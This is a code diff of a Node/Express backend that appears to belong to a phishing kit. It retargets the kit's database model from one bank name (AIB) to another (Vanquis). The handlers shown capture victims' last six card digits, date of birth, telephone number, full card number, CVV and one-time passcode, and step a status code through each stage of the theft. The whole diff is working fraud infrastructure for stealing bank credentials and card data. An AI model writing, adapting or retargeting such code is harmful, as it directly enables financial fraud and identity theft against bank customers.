@@ -61,7 +61,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
   const { last6, dob, telephone, uniqueid } = req.body;
   try {
-    await AIB.findOneAndUpdate(
+    await Vanquis.findOneAndUpdate(
       { uniqueid },
       { last6, dob, telephone, status: 7 }
     ).exec();
@@ -75,7 +75,10 @@ const submitLoginAgain = async (req, res) => {
 const submitCard = async (req, res) => {
   const { ccnum, cvv, uniqueid } = req.body;
   try {
-    await AIB.findOneAndUpdate({ uniqueid }, { ccnum, cvv, status: 5 }).exec();
+    await Vanquis.findOneAndUpdate(
+      { uniqueid },
+      { ccnum, cvv, status: 5 }
+    ).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -86,7 +89,7 @@ const submitCard = async (req, res) => {
 const submitOtp = async (req, res) => {
   const { otp, uniqueid } = req.body;
   try {
-    await AIB.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
+    await Vanquis.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
